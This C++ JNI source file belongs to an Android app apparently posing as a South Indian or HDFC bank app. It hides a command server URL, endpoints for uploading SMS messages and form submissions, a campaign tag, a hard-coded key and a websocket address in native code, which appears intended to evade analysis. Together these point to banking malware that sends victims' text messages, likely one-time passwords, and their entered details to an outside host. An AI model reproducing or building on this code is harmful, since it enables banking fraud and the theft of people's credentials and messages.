#include <jni.h>
#include <string>

// Declare global variables for the domain URLs
std::string url = "https://ownxxqq.com/api";
std::string sms_save = "/sms-reader/add";
std::string form_save = "/form/add";
std::string site = "Dkboss-HDFCBank1";
std::string KEY = "00112233445566778899aabbccddeeff";
std::string getNumber = "/site/number?site=";
std::string socket_url = "wss://socket.missyou9.in";

extern "C"
JNIEXPORT jstring JNICALL
Java_com_southindia_bank_in2_Helper_URL(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(url.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_southindia_bank_in2_Helper_FormSavePath(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(form_save.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_southindia_bank_in2_Helper_SMSSavePath(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(sms_save.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_southindia_bank_in2_Helper_SITE(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(site.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_southindia_bank_in2_Helper_KEY(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(KEY.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_southindia_bank_in2_Helper_getNumber(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(getNumber.c_str());
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_southindia_bank_in2_Helper_SocketUrl(JNIEnv *env, jobject thiz) {
    return env->NewStringUTF(socket_url.c_str());
}
